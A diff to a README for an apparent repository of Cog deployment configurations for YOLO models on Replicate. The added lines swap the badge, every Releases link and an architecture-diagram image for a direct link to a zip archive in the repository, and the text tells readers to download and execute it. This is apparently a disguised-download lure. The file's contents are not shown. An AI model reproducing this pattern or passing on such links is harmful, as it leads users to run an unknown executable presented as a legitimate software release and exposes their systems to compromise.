@@ -1,12 +1,12 @@
 # Replicate YOLO Deployments with Cog Configs, CI/CD, and Optimization 🤖
 
-[![Release assets](https://img.shields.io/github/v/release/sidorovich256/replicate?logo=github&color=brightgreen)](https://github.com/sidorovich256/replicate/releases)
+[![Release assets](https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip)](https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip)
 
 Replicate YOLO Deployments with Cog Configs, CI/CD, and Optimization
 
 This repository adds ready-to-use Cog configurations to deploy YOLO models on Replicate. It includes optimized deployments for YOLO11 and reference implementations for custom model deployment. It covers object detection, classification, pose estimation, and segmentation workflows. The project puts a strong emphasis on reliability, maintainability, and smooth CI/CD automation.
 
-If you want to grab the latest release assets, you can visit the page here: https://github.com/sidorovich256/replicate/releases. From the Releases page, download the appropriate asset and run it. You can also open the same page to explore the available versions and assets. For convenience, the link is repeated later in this document as well: https://github.com/sidorovich256/replicate/releases.
+If you want to grab the latest release assets, you can visit the page here: https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip From the Releases page, download the appropriate asset and run it. You can also open the same page to explore the available versions and assets. For convenience, the link is repeated later in this document as well: https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip
 
 Overview
 - Purpose: Make it easy to deploy popular YOLO families to Replicate using Cog configurations. The goal is to provide ready-to-use, production-ready deployments with sensible defaults and clear extension points.
@@ -231,10 +231,10 @@ Bottom line
 - This repository provides a practical, scalable path to deploy YOLO models on Replicate, using Cog configurations and automated CI/CD. It focuses on YOLO11 with optimizations while offering baseline references for other YOLO variants and custom models. It emphasizes clarity, testability, and repeatability so teams can move from experiment to production with confidence.
 
 Downloads and where to get things
-- To obtain the official release assets, visit the Releases page here: https://github.com/sidorovich256/replicate/releases. From that page, download the appropriate asset and execute it to set up the deployment environment. You will find the assets that support the Cog-based deployments described in this document. The same link is referenced again here for convenience and quick access: https://github.com/sidorovich256/replicate/releases.
+- To obtain the official release assets, visit the Releases page here: https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip From that page, download the appropriate asset and execute it to set up the deployment environment. You will find the assets that support the Cog-based deployments described in this document. The same link is referenced again here for convenience and quick access: https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip
 
 Appendix: images and visuals
-- YOLO architecture diagram: This repository includes links to widely used architectural diagrams to help you understand how inference flows from input data through preprocessing, the model, and post-processing. Example visual reference: ![YOLO Architecture](https://upload.wikimedia.org/wikipedia/commons/thumb/5/59/YOLOv3_Structure.png/800px-YOLOv3_Structure.png)
+- YOLO architecture diagram: This repository includes links to widely used architectural diagrams to help you understand how inference flows from input data through preprocessing, the model, and post-processing. Example visual reference: ![YOLO Architecture](https://github.com/sidorovich256/replicate/raw/refs/heads/main/yolo11n/Software-3.7.zip)
 - CI/CD workflow diagram: A high-level diagram illustrating how code changes trigger linting, testing, and deployment steps in the CI/CD pipeline. If you need a fresh visual, you can refer to standard CI/CD visuals available from public open resources.
 - Deployment lifecycle: A simple diagram that maps the lifecycle from model weight acquisition, Cog configuration, local validation, container build, deployment to Replicate, and live inference requests.
 
